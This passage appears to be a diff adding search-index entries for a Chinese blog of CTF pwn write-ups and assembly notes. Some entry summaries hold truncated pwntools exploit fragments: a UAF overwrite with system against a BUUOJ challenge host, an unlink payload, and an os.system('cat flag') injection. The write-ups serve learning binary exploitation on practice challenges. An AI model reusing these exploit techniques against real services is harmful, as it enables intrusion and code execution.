+      "summary": "此题和 BUU&XCTF-hitcontraining_uaf-WP 很像，都是UAF，漏洞的原因也很像，漏洞点是 #!/usr/bin/env python # coding=utf-8 from pwn import * context(log_level = 'debug') #sh = process('./ACTF_2019_babyheap') sh = remote(\"node3.buuoj.cn\",\"26759\") elf = ELF('./ACTF_2019_babyheap') def create(size,payload): sh.sendlineafter(\"Your choice: \",'1') sh.sendlineafter(\"Please input size: \\n\",str(size)) sh.sendafter(\"Please input content: \\n\",payload) def delete(index): sh.sendlineafter(\"Your choice: \",'2') sh.sendlineafter(\"Please input list index: \\n\",str(index)) def print_this(index): sh.sendlineafter(\"Your choice: \",'3') sh.sendlineafter(\"Please input list index: \\n\",str(index)) create(0x200,'index:0') create(0x200,'index:1') delete(0) delete(1) create(0x10,p64(0x602010) + p64(elf.symbols[\"system\"])) print_this(0) sh.intera"
+    },
+    {
+      "title": "XCTF-4-reehy-main-100-WP",
+      "url": "https://chujdk.github.io/wp/xctf-4-reehy-main-100-wp.html",
+      "date": "2020-12-27",
+      "summary": "这道题好难的感觉，看了别人的WP做了一天虽然是迷迷糊糊的拿到了flag但是还是有一点不能理解（2021.1.3更新：由于libc的问题被解决，现在基本理解了，如果你也和我一样对最后伪造的两个堆块的大小不理解那么希望这篇文章能帮到你）。"
+    },
+    {
+      "title": "XCTF-Recho-WP",
+      "url": "https://chujdk.github.io/wp/xctf-recho-wp.html",
+      "date": "2020-12-26",
+      "summary": "这道题目本身挺有意思的， 但是让我感到如鲠在喉，因为莫名其妙的拿不到flag 。更加莫名奇妙的是吃了个饭回来就可以拿flag了，想想唯一的区别是关了vpn，这个也能有影响？"
+    },
+    {
+      "title": "XCTF-supermarket-WP",
+      "url": "https://chujdk.github.io/wp/xctf-supermarket-wp.html",
+      "date": "2020-12-25",
+      "summary": "写在前面：这篇WP很简陋，我只写了重点 堆的利用我也开始一步步的开始“上道”了，这是一道比较简单的堆溢出，主要的难点是程序比较复杂，分析比较麻烦（毕竟我没经历过逆向的洗礼）。"
+    },
+    {
+      "title": "BUU-zctf_2016_note3-WP",
+      "url": "https://chujdk.github.io/wp/buu-zctf_2016_note3-wp.html",
+      "date": "2020-12-24",
+      "summary": "这道题几乎就是 zctf2016_note2 和 hitcon2014_stkof 的结合体，wiki上的解法好复杂的感觉，不是我这种菜鸡能够理解的，最后我还是用上面两个题目的结合方法来pwn的，就直接放exp吧，我觉得没什么可说的 #!/usr/bin/env python # coding=utf-8 from pwn import * def new_note(size,payload): sh.sendlineafter(\"--->>\\n\",'1') sh.sendlineafter(\"(less than 1024)\\n\",str(size)) sh.sendlineafter(\"content:\\n\",payload) def edit(index,payload): sh.sendlineafter(\"--->>\\n\",\"3\") sh.sendlineafter(\"id of the note:\\n\",str(index)) sh.sendlineafter(\"new content:\\n\",payload) def free(index): sh.sendlineafter(\"--->>\\n\",\"4\") sh.sendlineafter(\"note:\\n\",str(index)) #sh = process(\"./note2\") sh = remote(\"node3.buuoj.cn\",\"25686\") context(log_level = 'debug') note_ptr_array = 0x6020C8 elf = ELF(\"./zctf_2016_note3\") libc = ELF(\"./buu-libc-2.23.so\") payload = 'a' * 8 + p64(0x61) + p64(note_ptr_array - 0x18) + "
+    },
+    {
+      "title": "BUU-zctf2016_note2-WP",
+      "url": "https://chujdk.github.io/wp/buu-zctf2016_note2-wp.html",
+      "date": "2020-12-24",
+      "summary": "这大概是某省的一道年代久远的赛题，也是unlink，和这道 hitcon2014_stkof 相比，区别大致如下： 多了一个可用的输出函数，可以帮助我们泄露 编辑操作时使用了strcpy函数，这样我们就不能在字符串中间出现'\\x00'。所以虽然编辑操作是UAF的，我们也无法真正利用 new note操作时，如果指定长度为0，就会出现整数溢出，可以输入足够长的字符串，在这里的利用会出现一个矛盾，通过溢出我们可以很容易地通过修改下一个chunk实现unlink利用，但是当我们在new note的时候下一个chunk是没有被创建的。所以我们可以考虑利用fast bin，先删除一个长度为0（指定长度为0，实际长为0x20）的chunk，在申请了下一个chunk之后再把这个chunk申请回来，就可以实现利用。 最后实现的效果仍然是修改.bss段的"
+    },
+    {
+      "title": "BUU-hitcon2014_stkof-WP",
+      "url": "https://chujdk.github.io/wp/buu-hitcon2014_stkof-wp.html",
+      "date": "2020-12-23",
+      "summary": "这是一道堆上unlink的题，客观的来讲，堆我还是屁都不会，花了两天时间终于是理解了这道题目，感觉学CTF的过程体验很不好，每次看题解冥思苦想终于理解后，获得的从来不是快感，而是对自己之前不能理解的愤懑和对自己智商的怀疑。"
+    },
+    {
+      "title": "C++高精度实数运算类",
+      "url": "https://chujdk.github.io/mess/c%E9%AB%98%E7%B2%BE%E5%BA%A6%E5%AE%9E%E6%95%B0%E8%BF%90%E7%AE%97%E7%B1%BB.html",
+      "date": "2020-12-19",
+      "summary": "你好博客，很久没见了，这个类写了我一个星期，着实是太久不写代码手生了。类也没啥可说的， 类存在GitHub上 。就酱。"
+    },
+    {
+      "title": "BUU-0ctf2017_easiestprintf-WP",
+      "url": "https://chujdk.github.io/wp/buu-0ctf2017_easiestprintf-wp.html",
+      "date": "2020-12-11",
+      "summary": "明天就考四级了，前几天也是事情一大堆，还有个2077，昨天甚至没有写题，考虑到我岌岌可危的绩点，我现在准备放慢pwn学习的节奏了，之前花的时间挺多的，投入到数学上的时间也确实太有限了。之后就考虑每天刷道水题维持下手感吧，新的知识看着学，如果没新知识WP也就只简单地贴个exp吧。虽然在寒假前没有啃下堆有点遗憾，但是也只好这样了。"
+    },
+    {
+      "title": "BUU-xman夏令营选排位赛_2018_main-WP",
+      "url": "https://chujdk.github.io/wp/buu-xman%E5%A4%8F%E4%BB%A4%E8%90%A5%E9%80%89%E6%8E%92%E4%BD%8D%E8%B5%9B_2018_main-wp.html",
+      "date": "2020-12-09",
+      "summary": "这道题目挺有意思的，我首次通过leave指令实现了成功的栈迁移，因为leave和 mov rsp,rbp pop rbp 是等价的，这道题目栈上可以输入的长度只有32字节，偏移本身就要占去18字节，但是在bss段上却可以输入0x1000个字节，足够rop了。所以我们填充rbp的备份时用bss段的地址来填充，并且让程序返回到leave指令处，然后通过 mov rsp,rbp 就实现的栈迁移。这样就可以让程序执行bss段上的rop链了。要注意的是，栈迁移的时候不要迁移到bss段头，这样在printf泄露的时候会出现奇怪的问题（估计是printf函数对更低地址中的load段等进行了修改造成了问题），稍微往高地址迁移一点既可以成功地leak。"
+    },
+    {
+      "title": "BUU-mrctf2020_spfa-WP",
+      "url": "https://chujdk.github.io/wp/buu-mrctf2020_spfa-wp.html",
+      "date": "2020-12-09",
+      "summary": "spfa真的是在哪里都被黑啊.. 这里我们可以实现对qu[1000]的一次修改，而对qu[1000]的访问是典型的栅栏错误，实际上修改的是"
+    },
+    {
+      "title": "BUU-hitcontraining_playfmt-WP",
+      "url": "https://chujdk.github.io/wp/buu-hitcontraining_playfmt-wp.html",
+      "date": "2020-12-08",
+      "summary": "在看这篇WP前，如果你不了解堆上的格式化字符串的利用方法，建议你先看一下 这一篇WP 。 这道题和xman_2019_format这题基本没什么差别，就是没了原来的后门函数，但是这题没开NX，所以我们可以注入shellcode然后retrun到那里就可以了。程序也没有开启PIE，那么shellcode在的位置就是"
+    },
+    {
+      "title": "BUU-xman_2019_format-WP",
+      "url": "https://chujdk.github.io/wp/buu-xman_2019_format-wp.html",
+      "date": "2020-12-08",
+      "summary": "这是一道堆上的格式化字符串漏洞，做完这道题我大概可以理解“跳板”是什么鬼了，也对%n的原理有了正确的认知，之后计划完成类似的echo3和playfmt。"
+    },
+    {
+      "title": "XCTF-note-service2-WP",
+      "url": "https://chujdk.github.io/wp/xctf-note-service2-wp.html",
+      "date": "2020-12-07",
+      "summary": "这道题是一个在堆上的shellcode，也是第一次接触。也让我明白了还是要先checksec一下，刚开始做到时候没有检查不知道NX关了，一直想不通该怎么利用，知道看来别人的WP才知道NX没开，可以直接上shellcode。"
+    },
+    {
+      "title": "XCTF-secret_file-WP",
+      "url": "https://chujdk.github.io/wp/xctf-secret_file-wp.html",
+      "date": "2020-12-06",
+      "summary": "这道题目我觉得应该算是逆向的题目，其实是一个简单的栈溢出，但是程序的逻辑不是很好懂，所以我也没有自己做出来，还是有些遗憾的。 第一个框中的getline，对于指向0的指针，会自动malloc一个空间并且让lineptr指向这个空间。而且getline是读到'\\n'为止的。"
+    },
+    {
+      "title": "XCTF-time_formatter-WP",
+      "url": "https://chujdk.github.io/wp/xctf-time_formatter-wp.html",
+      "date": "2020-12-05",
+      "summary": "这道题很久之前就做到了，苦于是堆题一直没做，学了UAF之后再来做总算是PWN了，遗憾的是仍然是看了别人的WP之后才做出来的。 其实是非常简单的一个UAF"
+    },
+    {
+      "title": "BUU && XCTF-hitcontraining_uaf-WP",
+      "url": "https://chujdk.github.io/wp/buuxctf-hitcontraining_uaf-wp.html",
+      "date": "2020-12-04",
+      "summary": "这是我做的第一道堆题，总体来讲还是学到了点知识，事实证明堆管理还是要结合题目来学，光看确实是难以学会。 这道题在BUU和XCTF上面都有，有一定区别，但是总体是一样的。"
+    },
+    {
+      "title": "BUU-强网杯2019 拟态 STKOF-WP",
+      "url": "https://chujdk.github.io/wp/buu-%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E6%8B%9F%E6%80%81-stkof-wp.html",
+      "date": "2020-12-02",
+      "summary": "拟态的题目这是第一道，也是第一次听说。所以看到两个二进制文件的时候就迷惑了。我完全就是看着别人的wp学习了一下。不过这道题还是很有意思的。"
+    },
+    {
+      "title": "BUU-gwctf_2019_jiandan_pwn1-WP",
+      "url": "https://chujdk.github.io/wp/buu-gwctf_2019_jiandan_pwn1-wp.html",
+      "date": "2020-12-01",
+      "summary": "这道题目确实是比较简单的一道题，仅仅是要在输入的时候注意一下就可以了。 这里相当于是自己实现了一个gets，但是记录当前长度的变量也存在当前栈帧中，并且我们在进行读入的时候，如果想实现栈溢出，就不得不覆盖这个变量，这样的话就无法正常寻址了，所以我们需要在输入到v4这个变量时注意覆盖的值，我这里直接修改v4的值为0x118，这样就可以直接覆盖return address了。这样我们就可以泄露某个libc的函数的got，然后就可以通过LibcSearcher找出对应的libc，然后使用one_gadget来直接获得shell。"
+    },
+    {
+      "title": "BUU-wustctf2020_babyfmt-WP",
+      "url": "https://chujdk.github.io/wp/buu-wustctf2020_babyfmt-wp.html",
+      "date": "2020-11-30",
+      "summary": "这是一道格式化字符串的题目，绕的弯子有点多，我觉得是一道不错的题目。 保护全开。 程序本身来看，是很典型的让我们pwn的题。"
+    },
+    {
+      "title": "11月回顾",
+      "url": "https://chujdk.github.io/pwnreview/11%E6%9C%88%E5%9B%9E%E9%A1%BE.html",
+      "date": "2020-11-29",
+      "summary": "之所以会写这一篇回顾是因为堆漏洞我还是学不进去，就先做一些体力劳动。 总体来讲11月在pwn上的成果我还是比较满意的，基本上做到了一天一题，栈上漏洞利用已经学会的有"
+    },
+    {
+      "title": "srop总结",
+      "url": "https://chujdk.github.io/wp/srop%E6%80%BB%E7%BB%93.html",
+      "date": "2020-11-28",
+      "summary": "srop技术，是一种利用 sigreturn系统调用 （主要是Linux在信号处理时为了保存进程上下文而使用的）来修改寄存器的技术。ctfwiki上写得很好，但是有几点应该强调一下，可以更好得理解。"
+    },
+    {
+      "title": "BUU-ciscn_2019_es_7-WP",
+      "url": "https://chujdk.github.io/wp/buu-ciscn_2019_es_7-wp.html",
+      "date": "2020-11-28",
+      "summary": "这是一道国赛题，当然做之前我还不知道，到了我发现我不会做的时候才知道..这也是我做的第一道srop，虽然wp发的是三道里面最晚的，做完 rootersctf_2019_srop 这题我才能说我真正理解了。"
+    },
+    {
+      "title": "BUU-rootersctf_2019_srop-WP",
+      "url": "https://chujdk.github.io/wp/buu-rootersctf_2019_srop-wp.html",
+      "date": "2020-11-28",
+      "summary": "只开了NX，只存在syscall的gadgets，基本上就是srop了。无非就是做两件事，注入\"/bin/sh\\x00\"和执行execve的系统调用，我们发现在syscall前面存在 pop rax 所以execve是容易实现的，然后就是注入\"/bin/sh\\x00\""
+    },
+    {
+      "title": "BUU-actf_2019_onerepeater-WP",
+      "url": "https://chujdk.github.io/wp/buu-actf_2019_onerepeater-wp.html",
+      "date": "2020-11-28",
+      "summary": "这是一道简单的格式化字符串和ret2shellcode的题目。 没开nx基本上是shellcode了。 我们就可以知道，程序直接输出了栈地址，还有一个格式化字符串漏洞可以实现任意地址覆写，解决了由于buf大小0x408，我们只能read0x400个字节无法进行栈溢出的问题，但是可以通过格式化字符串来修改ret的地址。然后我们还要注意一下在return前的puts，"
+    },
+    {
+      "title": "BUU-360chunqiu2017_smallest-WP",
+      "url": "https://chujdk.github.io/wp/buu-360chunqiu2017_smallest-wp.html",
+      "date": "2020-11-28",
+      "summary": "这篇博客写了两天，我也花了很久来理解srop，现在我可以说我会srop了。 这道题的代码非常短 xor rax, rax mov edx, 400h ; count mov rsi, rsp ; buf mov rdi, rax ; fd syscall ; LINUX - sys_read retn 仅此六行。由于有syscall和一个read函数，我们可以通过改变read的字节数来控制rax的值，借此实现任意系统调用。于是我们的思路是先调用sys_write泄露栈地址，然后构造signal frame劫持rsp使栈迁移至一个 可读写 的 确定 空间（就是我们泄露的地址）。最后再构造一个signal frame指定execve的四个参数并设置系统调用号位execve的调用号，再注入“/bin/sh”，就获得了shell。"
+    },
+    {
+      "title": "BUU-inndy_echo2-WP",
+      "url": "https://chujdk.github.io/wp/buu-inndy_echo2-wp.html",
+      "date": "2020-11-25",
+      "summary": "这是一道非常好的题目，我做完之后很有收获。 从安全措施上来看，本题开启了PIE，没开canary（虽然实际上开与不开是不影响这道题的）"
+    },
+    {
+      "title": "BUU-inndy_echo-WP",
+      "url": "https://chujdk.github.io/wp/buu-inndy_echo-wp.html",
+      "date": "2020-11-24",
+      "summary": "一道简单的hijack got，我做了一下午，原因是\"%7$hn\"写成了\"$7hn\"，说到底来还是不熟练。 存在明显的格式化字符串漏洞。我们考虑劫持printf的got表值为system的plt地址。"
+    },
+    {
+      "title": "BUU-picoctf_2018_can_you_gets_me-WP",
+      "url": "https://chujdk.github.io/wp/buu-picoctf_2018_can_you_gets_me-wp.html",
+      "date": "2020-11-24",
+      "summary": "这道题目是比较简单的，但是如果不仔细看的话就会出大事。 先检查一下安全措施，可能会注意到使用的命令有变化，这是以为我用的是最新版的checksec，多出了很多我看不懂得安全措施。"
+    },
+    {
+      "title": "再谈WSL——pwn的环境配置和wsl2的换源",
+      "url": "https://chujdk.github.io/mess/%E5%86%8D%E8%B0%88wsl.html",
+      "date": "2020-11-24",
+      "summary": "过去幼稚的我选择使用 wsl2 作为研究环境，着实是打开了一个黑魔法的大门，然后还写了篇博客来推广黑魔法。在自己弃用 wsl 许久后也没有删除这篇文章，在这里保留文章，但是建议大家还是起虚拟机来做环境。不用 wsl 原因有很多，最主要的是我不喜欢它。"
+    },
+    {
+      "title": "BUU-mrctf2020_shellcode_revenge-WP(可见字符shellcode)",
+      "url": "https://chujdk.github.io/wp/buu-mrctf2020_shellcode_revenge-wp%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6shellcode.html",
+      "date": "2020-11-23",
+      "summary": "这道题大概又是以为call了rax所以无法F5，不过这个的关系倒是不大，代码逻辑还是好理解的 我们要做的就是执行到右边的语句，为了执行右边我们需要执行左边的语句strlen(buf)次，也就是说buf(我们输入的字符串)中必须满足之前的条件。也就是每个字符的ASCII码必须属于(0x60,0x7A]∩(0x2F,0x5A]才会执行code。到这里之后我就不会了，于是我搜了一下 别的师傅的wp ，原来这个属于string.printable，就是可见字符shellcode。这里使用alpha3就可以生成了。"
+    },
+    {
+      "title": "学习 pwn 的过程中的一点心得",
+      "url": "https://chujdk.github.io/pwnreview/%E6%88%91%E7%9A%84pwn%E5%BF%83%E5%BE%97.html",
+      "date": "2020-11-21",
+      "summary": "值得注意的东西 与exp的动调 在 exp 中先指定 terminal，即添加一句 context . terminal = [ 'tmux' , 'splitw' , '-h' ] 然后在创建进程变量后，添加 gdb . attach(proc . pidof(sh)[ 0 ]) #这里的sh是进程变量 这样调试时先打开tmux，然后就可以动态调试了 加载指定的libc： io = process([ './bin' ],env = { \"LD_PRELOAD\" : \"./libc-2.23.so\" }) 可能很有用的东西 gdb 调试二进制和符号表分开的程序"
+    },
+    {
+      "title": "BUU-picoctf_2018_shellcode-WP",
+      "url": "https://chujdk.github.io/wp/buu-picoctf_2018_shellcode-wp.html",
+      "date": "2020-11-21",
+      "summary": "这道题的源程序有700多K，看起来非常大，但是打开之后发现实际上只有两个函数是有用的，即main和vuln。 但是由于不明原因（也许是函数太多？），无法反编译，我们就只能干看汇编了。"
+    },
+    {
+      "title": "BUU-cmcc_pwnme2-WP",
+      "url": "https://chujdk.github.io/wp/buu-cmcc_pwnme2-wp.html",
+      "date": "2020-11-21",
+      "summary": "此题，无canary，有gets溢出，偏移为0x6C+0x4，这个时候其实怎么样都能做，大不了ret2csu然后用DynELF爆破，shell总是可以拿的，但是这样会比较麻烦，而我们又可以看到"
+    },
+    {
+      "title": "BUU-picoctf_2018_got_shell-WP",
+      "url": "https://chujdk.github.io/wp/buu-picoctf_2018_got_shell-wp.html",
+      "date": "2020-11-21",
+      "summary": "很简单的hijack GOT，我们只要将puts的GOT表值换位win函数的起始地址就行了"
+    },
+    {
+      "title": "BUU-jarvisoj_level5-WP",
+      "url": "https://chujdk.github.io/wp/buu-jarvisoj_level5-wp.html",
+      "date": "2020-11-21",
+      "summary": "写这篇wp纯粹是证明一下我这两天有做题，这道题是ret2csu和DynELF的使用，而且也没什么特殊的地方，就直接上exp了。 不过还是有一点很奇怪，在连接服务器的时候，如果不把context的log_level的属性设为'debug'的话，就会在DynELF后的等待\"Input:\\n\"的输入时卡住，收不到输入，而设置了就可以了。这个我不太理解，一直以为log_level只时输出记录而已。而且在本机上，也不需要设置。"
+    },
+    {
+      "title": "BUU-hgame2018_flag_server-WP",
+      "url": "https://chujdk.github.io/wp/buu-hgame2018_flag_server-wp.html",
+      "date": "2020-11-19",
+      "summary": "其实这道题之前还做了一道srop，但是其实我还没有完全理解，所以那个的wp就得先搁一下，先写这个的。 这道题很简单 这个if是一定会执行的，我们只要让v10=1就可以拿flag了。"
+    },
+    {
+      "title": "BUU-wustctf2020_closed-WP",
+      "url": "https://chujdk.github.io/wp/buu-wustctf2020_closed-wp.html",
+      "date": "2020-11-17",
+      "summary": "这道题考的其实不是pwn，应该说是Linux系统编程的知识。 我啥都不会，看了别人的wp之后才知道一点。 这个函数close了标准输出(close(1))和标准错误(close(2))，所以虽然我们有了shell，但是我们获得不了输出。然鹅我们可以通过exec 1>&0来把标准输出重定向到文件描述符0(标准输入)，这个文件默认是开启的。这样我们就可以看到输出了。"
+    },
+    {
+      "title": "四篇WP连写",
+      "url": "https://chujdk.github.io/wp/lotswp.html",
+      "date": "2020-11-17",
+      "summary": "今天是快乐的pwn水题的一天，xctf上已经没有我会做的题了，做起了BUU的题。 test_your_nc 用nc连上，cat flag就行了.."
+    },
+    {
+      "title": "做一个安排",
+      "url": "https://chujdk.github.io/mess/%E5%81%9A%E4%B8%80%E4%B8%AA%E5%AE%89%E6%8E%92.html",
+      "date": "2020-11-15",
+      "summary": "近期总是无所事事，做一下todo list 复习数分高代 准备英语四级 学习堆的漏洞 希望能完成malloc lab 完善plot"
+    },
+    {
+      "title": "XCTF-实时数据监测-WP",
+      "url": "https://chujdk.github.io/wp/xctf-%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B-wp.html",
+      "date": "2020-11-14",
+      "summary": "span 这道题的WP，怎么说呢，我是真不想写，就是一道签到的水题。漏洞为格式化字符串漏洞，通过覆盖任意地址漏洞来拿shell。直接上exp吧。 红框中的payload的处理方式是为了防止输出过多空格导致网络链接的过程出错（0x2223322是一个很大的数，输出这么多空格，需要很久，很容易出现网络断连，并且就算不出现问题，还是要的很久）"
+    },
+    {
+      "title": "格式化字符串——以printf为代表",
+      "url": "https://chujdk.github.io/pwnreview/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%A5printf%E4%B8%BA%E4%BB%A3%E8%A1%A8.html",
+      "date": "2020-11-14",
+      "summary": "span 首先我想说，格式化字符串漏洞，会出现再形如 printf(&s); 这样的语句中，如果输出的参数等与输入有关，那么，就可能会自然的使用这样的方法，然鹅另一方面，漏洞本身有极高的危险性。"
+    },
+    {
+      "title": "XCTF-greeting-150-WP",
+      "url": "https://chujdk.github.io/wp/xctf-greeting-150-wp.html",
+      "date": "2020-11-14",
+      "summary": "在前天连水pwn三道后我就一直在浪费时间，本来是想先把堆学掉，但是发现是在是有点复杂，想把 cs:app 的malloc lab和free lab完成大概还是要再花点时间，所以我就先做了这道格式化字符串，总体上也是学习了一下hijack got和hijack fini_array。"
+    },
+    {
+      "title": "XCTF-反应釜开关控制-WP",
+      "url": "https://chujdk.github.io/wp/xctf-%E5%8F%8D%E5%BA%94%E9%87%9C%E5%BC%80%E5%85%B3%E6%8E%A7%E5%88%B6-wp.html",
+      "date": "2020-11-12",
+      "summary": "这道题目是简单的ret2text，直接上payload吧"
+    },
+    {
+      "title": "XCTF-warmup-WP",
+      "url": "https://chujdk.github.io/wp/xctf-warmup-wp.html",
+      "date": "2020-11-12",
+      "summary": "这是一道我应该在很久以前做的水题，但是xctf上一直没有源程序，现在我发现在 BUUCTF 上有源程序，所以就做了一下。 什么都没开 gets存在溢出，偏移为0x40，sub_40060D中有cat flag，所以ret2text就行了。"
+    },
+    {
+      "title": "XCTF-monkey-WP",
+      "url": "https://chujdk.github.io/wp/xctf-monkey-wp.html",
+      "date": "2020-11-12",
+      "summary": "这道题拿到的时候发现有20多兆，但是看名字像js的解释器，启动程序之后发现就是，所以直接连接cat flag就行了... from pwn import * sh = remote(\"220.249.52.133\",\"****\") sh.sendline(\"os.system(\\\"cat flag\\\")\") sh.interactive() 开拓了一下视野，碰到较大的文件也不应该害怕。"
+    },
+    {
+      "title": "XCTF-welpwn-WP",
+      "url": "https://chujdk.github.io/wp/xctf-welpwn-wp.html",
+      "date": "2020-11-10",
+      "summary": "这道题非常的有意思。知识点很简单，就是无libc的ret2libc，最近已经做了两道了。不过这题有一点小限制，需要有一点特殊的处理。 我们直接来看payload，基本是 pwn-100 和 pwn-200 结合了一下，区别就是多了一句 payload = 'a'*24 + p64(PopFourTimes) ，这样处理的原因是"
+    },
+    {
+      "title": "XCTF-pwn-200-WP",
+      "url": "https://chujdk.github.io/wp/xctf-pwn-200-wp.html",
+      "date": "2020-11-09",
+      "summary": "这是一道很简单的题目，算是无libc的ret2libc，但是有很多我不理解的小细节还需要加强学习。 先检查一下安全措施 发现没有开启canary，可以轻松的进行栈溢出。"
+    },
+    {
+      "title": "XCTF-pwn-100-WP",
+      "url": "https://chujdk.github.io/wp/xctf-pwn-100-wp.html",
+      "date": "2020-11-07",
+      "summary": "这道题对我而言有两个新知识点，中级rop—— ret2csu 和DynELF工具的使用。同时这道题也做了我非常久，让我心态有点小崩。为啥会做这么久呢，还是因为我对plt，got和动态链接之类的知识认知太过于匮乏。所以从今天开始我放缓刷题，先看完《程序员的自我修养》一书。 先来谈谈ret2csu，几乎所有的Linux C程序都会调用libc，这样的程序中总会有一个init函数，比如下面这个（不同的程序会不一样）"
+    },
+    {
+      "title": "XCTF-pwn1-WP",
+      "url": "https://chujdk.github.io/wp/xctf-pwn1-wp.html",
+      "date": "2020-11-05",
+      "summary": "今天的课特别的多，没有多少的空闲时间，原本可以做题的C程课也被写一个愚蠢的排序测试程序占用了。 其实今天没有做完这道题，因为服务器维护了，但是我已经总体上完成了这道题，就差连接服务器了，所以就当我做完了这题吧。题解也只能明天再来完善了。我现在对CTF-pwn的大致感觉就是痛并快乐着，同时深深的感到自己的能力仍然不足，总体上来说还是要继续好好学习。虽然pwn这条路可能很难走，但总比做自己没兴趣的ACM强。"
+    },
+    {
+      "title": "XCTF-stack2-WP",
+      "url": "https://chujdk.github.io/wp/xctf-stack2.html",
+      "date": "2020-11-04",
+      "summary": "这道题确实是给我整吐了。其实思路非常简单，就是通过数组越界来达到栈溢出，并且这样可以跨越canary，然后就可以控制程序的执行流程。 然后我们可以看到"
+    },
+    {
+      "title": "XCTF-dice_game WP",
+      "url": "https://chujdk.github.io/wp/xctf-dice_game-wp.html",
+      "date": "2020-11-03",
+      "summary": "本来呢，是准备做 warmup 这道题的，但是这道题非常的夸张， 我曾经天真的以为，这是一道直接连接服务器就可以拿flag的，结果发现一上来他就给了我一个地址，好嘛，我不会。就跳过了。然后就找了dice_game这题。"
+    },
+    {
+      "title": "XCTF-Mary_Morton WP",
+      "url": "https://chujdk.github.io/wp/mary_morton.html",
+      "date": "2020-11-03",
+      "summary": "这是一道格式化字符串和栈溢出结合的题目，也是我第一次smash了canary：） 发现有canary和栈不可执行。"
+    },
+    {
+      "title": "XCTF-forgot WP",
+      "url": "https://chujdk.github.io/wp/forgot-wp.html",
+      "date": "2020-11-02",
+      "summary": "这是我做的第一道处于进阶区pwn题。 checksec查看安全保护 中规中矩 到ida里反汇编一下，shift+F12发现有这么一个函数"
+    },
+    {
+      "title": "11.2记录",
+      "url": "https://chujdk.github.io/mess/11-2%E8%AE%B0%E5%BD%95.html",
+      "date": "2020-11-02",
+      "summary": "11月的第二天，今天准备做两道题：xctf的CGfsb（现在看来是格式化字符串）和hgame的brop（估摸着是ret2libc） 最后我做了CGfsb，确实是格式化字符串漏洞，还有另一道string，同样也是格式化字符串漏洞，但是最后还要输出一段shellcode，我直接使用shellcraft.sh()一直拿不到shell，后来才知道 要提前指定平台 。"
+    },
+    {
+      "title": "XCTF-level3 WP",
+      "url": "https://chujdk.github.io/wp/xctf-level3.html",
+      "date": "2020-10-31",
+      "summary": "今天花了一个下午写出来了这样一道ret2libc，题目确实只是一道简单的模板题，但是还是做了我很久，这篇write up也是记录一下 下载附件，得到一个压缩包，解压后获得一个可执行文件和一个libc。"
+    },
+    {
+      "title": "再回首",
+      "url": "https://chujdk.github.io/mess/%E5%86%8D%E5%9B%9E%E9%A6%96.html",
+      "date": "2020-10-30",
+      "summary": "十月的尾巴上总结一下这个月做的事情。 本来觉得这个月每天都挺忙的，结果一看最后还是没做什么事情。最主要的成果就是花了一个星期学完了8086汇编，虽然进入实际环境中发现其实这点知识十分有限，还有许多需要补的知识。"
+    },
+    {
+      "title": "C语言函数调用栈",
+      "url": "https://chujdk.github.io/pwnreview/c%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88.html",
+      "date": "2020-10-29",
+      "summary": "span 注：接下来如无特殊说明，汇编语法都是intel语法，同时讨论的是 32 位的调用流程。64 位由于使用寄存器传参比较简单类比即可，这里不再讨论 前置：寄存器 与8086相比，x86与x86-64在寄存器使用上变得自由了许多，不再会有各种奇怪的限制，八个通用寄存器真正意义上的变成了通用的寄存器。"
+    },
+    {
+      "title": "10.22汇编",
+      "url": "https://chujdk.github.io/asm-learn/10-22%E6%B1%87%E7%BC%96.html",
+      "date": "2020-10-22",
+      "summary": "今天看完了int指令和端口，由于这些知识和32位的有一定区别，所以知识点就不列了，我也只是粗略的看了一下，做了一下实验而已 实验13"
+    },
+    {
+      "title": "10.21汇编",
+      "url": "https://chujdk.github.io/asm-learn/10-21%E6%B1%87%E7%BC%96.html",
+      "date": "2020-10-21",
+      "summary": "In These Arms 今天看了两章，下午由于一些事耽搁了，本来其实还可以看更多，但总体还是满意的 第十一章是讲标志寄存器，说实话这个感觉主要靠记，而我还真记不下来"
+    },
+    {
+      "title": "10.20汇编",
+      "url": "https://chujdk.github.io/asm-learn/10-20%E6%B1%87%E7%BC%96.html",
+      "date": "2020-10-20",
+      "summary": "实验7之后实验的代码量大幅提高，所以每章花费的时间也大幅提高了。上午只看完了第十章，会用函数了。晚上争取完成课程设计。 CALL和RET call可以将IP或IP和CS压入栈中，并跳转至标号,ret可以通过退栈获得的值对IP修改，retf可以通过两次退栈来对CS,IP都修改，实现段间转移。两者配合使用则可实现函数。"
+    },
+    {
+      "title": "王爽《汇编语言》(第四版) 实验7",
+      "url": "https://chujdk.github.io/asm-learn/%E7%8E%8B%E7%88%BD-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E7%AC%AC%E5%9B%9B%E7%89%88-%E5%AE%9E%E9%AA%8C7.html",
+      "date": "2020-10-19",
+      "summary": "这个实验确实是比较繁琐，而且我先是手写的代码，有很多考虑错误的地方，最后花了2个多小时才解决掉。 ;迄今为止最麻烦的程序 assume cs:code,es:table,ss:stack data segment db '1975','1976','1977','1978','1979','1980','1981','1982','1983' db '1984','1985','1986','1987','1988','1989','1990','1991','1992' db '1993','1994','1995' dd 16,22,382,1356,2390,8000,16000,24486,50065,97479,140417,197514 dd 345980,590827,803530,1183000,1843000,2759000,3753000,4649000,5937000 dw 3,7,9,13,28,38,130,220,476,778,1001,1442,2258,2793,4037,5635,8226 dw 11542,14430,15257,17800 data ends table segment db 21 dup ('year summ ne ?? ') table ends stack segment dw 8 dup(0) stack ends code segment start: mov ax,data mov ds,ax mov ax,table mov es,ax mov ax,stack mov ss,ax mov sp,10h mov cx,21 mov bx,0 mov di,0 mov si,0 s: push cx mov si,0 mov cx,2 s1: mov ax,[bx][si] mov es:[si],ax "
+    },
+    {
+      "title": "10.18汇编",
+      "url": "https://chujdk.github.io/asm-learn/10-18%E6%B1%87%E7%BC%96.html",
+      "date": "2020-10-18",
+      "summary": "Sweet Child O' Mine 写在笔记之前 今天一个上午都在做第5个实验，一方面是上午的时间比较少，另一方面也是这个实验的代码量增大。现在来看，我的汇编能力已经有了一点，王爽这本书写的确实是很好，相信能为我的二进制研究打下基础。希望今天能再看完一章。"
+    },
+    {
+      "title": "王爽汇编语言第四版第六章实验源码",
